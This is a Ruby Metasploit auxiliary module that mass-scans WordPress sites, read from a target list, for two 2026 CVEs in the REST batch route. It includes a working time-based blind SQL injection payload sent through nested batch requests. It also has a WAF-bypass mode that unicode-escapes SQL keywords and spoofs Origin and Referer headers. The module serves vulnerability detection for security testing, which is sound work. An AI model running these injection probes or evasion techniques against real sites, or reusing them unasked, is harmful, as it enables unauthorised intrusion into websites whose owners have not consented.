##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WordPress wp2shell Exposure Scanner (CVE-2026-63030 + CVE-2026-60137)',
        'Description' => %q{
          Non-destructive scanner for the WordPress REST API Batch Route Confusion
          (CVE-2026-63030) and Blind SQLi (CVE-2026-60137) vulnerabilities.

          Supports two scan modes:
          1. Single target: set RHOSTS + VHOST as usual
          2. File scan: set TARGET_FILE to a file with one domain/IP per line

          When TARGET_FILE is set, each line is treated as a domain — the module
          resolves it, sets VHOST automatically, and scans. This handles Cloudflare
          and shared hosting correctly.
        },
        'Author' => [
          'Venexy (Kamaldeep Rajal) <predator0x300@gmail.com>',
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2026-63030'],
          ['CVE', '2026-60137'],
          ['URL', 'https://blog.zsec.uk/wp2shell-code-trace-deep-dive/'],
          ['URL', 'https://www.rapid7.com/blog/post/etr-cve-2026-63030-wp2shell-a-critical-remote-code-execution-vulnerability-in-wordpress-core/'],
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => [],
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'WordPress base path', '/']),
      OptPath.new('TARGET_FILE', [false, 'File with one domain/IP per line to scan']),
      OptBool.new('CONFIRM_SQLI', [true, 'Confirm blind SQLi with timing probe (slower but definitive)', false]),
      OptFloat.new('SLEEP_TIME', [true, 'SLEEP seconds for SQLi confirmation', 3.0]),
      OptBool.new('WAF_BYPASS', [true, 'Use WAF bypass (colon primer, unicode escape, /wp-json/ path)', false]),
      Opt::RHOST(nil, false),
      Opt::RPORT(443),
      OptBool.new('SSL', [true, 'Use SSL/TLS', true]),
    ])
  end

  def base_uri
    normalize_uri(target_uri.path)
  end

  def run
    if datastore['TARGET_FILE']
      run_file_scan
    elsif datastore['RHOSTS'].to_s.strip.empty?
      print_error("Set RHOSTS for single target or TARGET_FILE for batch scan")
      return
    else
      scan_current_target
    end
  end

  def run_file_scan
    targets = []
    File.readlines(datastore['TARGET_FILE']).each do |line|
      line = line.strip
      next if line.empty? || line.start_with?('#')
      targets << line
    end

    if targets.empty?
      print_error("No targets in #{datastore['TARGET_FILE']}")
      return
    end

    print_status("Scanning #{targets.length} target(s) from #{datastore['TARGET_FILE']}...")
    print_status("")

    targets.each_with_index do |target, idx|
      begin
        scan_domain(target)
      rescue => e
        print_error("#{target} — error: #{e.message}")
      end
      print_status("Scanned #{idx + 1} of #{targets.length}") if (idx + 1) % 10 == 0
    end

    print_status("")
    print_status("Scan complete: #{targets.length} target(s)")
  end

  def scan_domain(domain)
    domain = domain.sub(%r{^https?://}, '').split('/').first

    begin
      ip = Rex::Socket.resolv_nbo(domain)
      ip = Rex::Socket.addr_ntoa(ip)
    rescue
      print_error("#{domain} — DNS resolution failed")
      return
    end

    saved_rhost = datastore['RHOSTS']
    saved_vhost = datastore['VHOST']

    datastore['RHOSTS'] = ip
    datastore['VHOST'] = domain

    begin
      scan_current_target(domain)
    ensure
      datastore['RHOSTS'] = saved_rhost
      datastore['VHOST'] = saved_vhost
    end
  end

  def scan_current_target(label = nil)
    vhost = datastore['VHOST'].to_s
    label ||= vhost.empty? ? datastore['RHOSTS'] : vhost

    begin
      res = send_request_cgi('method' => 'GET', 'uri' => base_uri)
    rescue => e
      print_error("#{label} — unreachable (#{e.message})")
      return
    end

    unless res
      print_error("#{label} — unreachable")
      return
    end

    m = res.body.match(/name="generator" content="WordPress ([^"]+)"/)

    if !m && [301, 302].include?(res.code) && res.headers['Location']
      loc = res.headers['Location']
      uri = loc.start_with?('/') ? loc : URI(loc).path rescue '/'
      res2 = send_request_cgi('method' => 'GET', 'uri' => uri) rescue nil
      m = res2.body.match(/name="generator" content="WordPress ([^"]+)"/) if res2
    end

    unless m
      [normalize_uri(base_uri, 'feed'), normalize_uri(base_uri, 'wp-json')].each do |path|
        res3 = send_request_cgi('method' => 'GET', 'uri' => path) rescue nil
        next unless res3
        m = res3.body.match(/generator>https?:\/\/wordpress\.org\/\?v=([^<]+)</) ||
            res3.body.match(/"generator"\s*:\s*"WordPress\/([^"]+)"/) ||
            res3.body.match(/name="generator" content="WordPress ([^"]+)"/)
        break if m
      end
    end

    unless m
      print_status("#{label} — WordPress not detected")
      return
    end
    ver = m[1].strip

    parts = ver.split('.').map(&:to_i)
    severity = nil
    cve = nil
    if parts[0] == 6 && parts[1] == 8 && (parts[2] || 0) <= 5
      severity = 'SQLi'
      cve = 'CVE-2026-60137'
    elsif parts[0] == 6 && parts[1] == 9 && (parts[2] || 0) <= 4
      severity = 'RCE'
      cve = 'CVE-2026-63030'
    elsif parts[0] == 7 && parts[1] == 0 && (parts[2] || 0) <= 1
      severity = 'RCE'
      cve = 'CVE-2026-63030'
    end

    unless severity
      print_status("#{label} — WordPress #{ver} — not affected")
      return
    end

    batch = if datastore['WAF_BYPASS']
              normalize_uri(base_uri, 'wp-json', 'batch', 'v1')
            else
              "#{base_uri}?rest_route=/batch/v1"
            end

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => batch,
      'data' => '{"requests":[]}',
      'ctype' => 'application/json'
    )

    batch_ok = res && [200, 207].include?(res.code)

    unless batch_ok
      print_warning("#{label} — WP #{ver} — affected (#{severity}) but batch route returned #{res&.code || 'nil'}")
      return
    end

    if datastore['CONFIRM_SQLI']
      confirmed = confirm_sqli(label)
      if confirmed
        print_good("#{label} — WP #{ver} — VULNERABLE (#{severity}, #{cve}) — SQLi CONFIRMED")
      else
        print_warning("#{label} — WP #{ver} — affected + batch open but SQLi timing not confirmed")
      end
    else
      print_good("#{label} — WP #{ver} — VULNERABLE (#{severity}, #{cve}) — batch route open")
    end
  end

  private

  def confirm_sqli(label)
    delay = datastore['SLEEP_TIME']
    primer = datastore['WAF_BYPASS'] ? ':' : 'http://:'

    fast_time = probe_sleep(0, primer)
    slow_time = probe_sleep(delay, primer)
    delta = slow_time - fast_time

    print_status("  #{label} — SQLi probe: fast=%.3fs slow=%.3fs delta=%.3fs" % [fast_time, slow_time, delta])
    delta >= (delay * 0.6)
  end

  def probe_sleep(seconds, primer)
    inject = "0) OR (SELECT 1 FROM (SELECT SLEEP(#{seconds}))x)-- -"

    if datastore['WAF_BYPASS']
      query_path = "/wp/v2/categories?author_exclude=#{inject}"
    else
      query_path = "/wp/v2/categories?author_exclude=#{Rex::Text.uri_encode(inject)}"
    end

    payload = {
      'requests' => [
        { 'method' => 'POST', 'path' => primer },
        { 'method' => 'POST', 'path' => '/wp/v2/posts', 'body' => {
          'requests' => [
            { 'method' => 'GET', 'path' => primer },
            { 'method' => 'GET', 'path' => query_path },
            { 'method' => 'GET', 'path' => '/wp/v2/posts' },
          ]
        }},
        { 'method' => 'POST', 'path' => '/batch/v1' },
      ]
    }

    json_body = payload.to_json
    json_body = unicode_escape_keywords(json_body) if datastore['WAF_BYPASS']

    batch_uri = if datastore['WAF_BYPASS']
                  normalize_uri(base_uri, 'wp-json', 'batch', 'v1')
                else
                  "#{base_uri}?rest_route=/batch/v1"
                end

    headers = {}
    if datastore['WAF_BYPASS']
      proto = datastore['SSL'] ? 'https' : 'http'
      host = datastore['VHOST'].to_s.empty? ? datastore['RHOSTS'] : datastore['VHOST']
      headers['Origin'] = "#{proto}://#{host}"
      headers['Referer'] = "#{proto}://#{host}/wp-admin/"
    end

    t0 = Time.now.to_f
    send_request_cgi({
      'method' => 'POST',
      'uri' => batch_uri,
      'data' => json_body,
      'ctype' => 'application/json',
      'headers' => headers,
    }, datastore['SLEEP_TIME'].to_i + 15)
    Time.now.to_f - t0
  end

  def unicode_escape_keywords(json_str)
    keywords = %w[
      author_exclude author__not_in
      SLEEP SELECT BENCHMARK IF UNION FROM WHERE SUBSTRING ASCII
      CHAR_LENGTH CONCAT COALESCE CASE WHEN THEN ELSE ORDER LIMIT
      CONCAT_WS OR AND NOT
    ]
    keywords.sort_by { |k| -k.length }.each do |kw|
      json_str = json_str.gsub(/(?<![a-zA-Z])#{Regexp.escape(kw)}(?![a-zA-Z])/i) do |m|
        m.chars.map { |c| "\\u%04x" % c.ord }.join
      end
    end
    json_str
  end
end
